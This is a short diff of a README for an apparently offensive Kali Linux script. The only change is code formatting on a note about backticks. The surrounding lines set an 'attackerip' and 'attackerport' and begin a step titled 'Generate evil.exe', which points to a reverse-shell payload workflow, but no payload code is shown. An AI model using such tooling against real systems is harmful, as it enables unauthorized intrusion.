@@ -12,7 +12,7 @@ This is a script to be used in Kali linux where the tools are already preinstall
     attackerip=`ifconfig eth0 | grep netmask | cut -d' ' -f10`
     attackerport=9107
     ```
-    The backtick is equivalent to bash $(...) 
+    The backtick is equivalent to bash `$(...) `
     
 2. Generate evil.exe
     ```sh
